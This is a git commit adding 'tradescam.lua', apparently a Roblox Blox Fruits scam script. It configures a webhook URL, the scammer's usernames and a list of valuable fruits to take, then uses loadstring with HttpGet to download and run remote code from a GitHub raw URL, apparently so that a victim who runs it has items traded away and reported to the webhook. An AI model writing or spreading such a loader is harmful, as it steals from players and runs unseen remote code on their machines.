3976ce4fcb6b13e3877ec7916de829a65cf38e73
Ryo-afk11 <mobilelegendsanime5@gmail.com>
2025-04-21 15:13:37 +0800

    Create tradescam.lua

---
+++ tradescam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=aE5yVkgzcnM2R3pBV3c3QmhPNWlLQTpWTk9WQ3VfbmtnVnRNRlR4aUxMdkNqNWdUa2dSbTNPa3FSa1JkS252VWROUW9mcFEwYmpjQXNnRTJXMHVtUkdWWkpWVlo5WW1XLWE2UzZjdWk0QkdVS0lwdkJtTnFPWWJXQktwb29fTXREcTNiUUJDaFpUcnNTRnJvSnU2UkZVWEZrOHItcTVaYm1fRTNTSlFHeVZUaHROVzFkdXhrcXRkRmF4WTQxUXY5Njg" -- << Your Webhook
+Usernames = {"ughtdawg", "UWEN_225"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Buddha-Buddha", "Dragon(West)-Dragon(West)","Dragon(East)-Dragon(East)", "Portal-Portal", "Gravity-Gravity"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
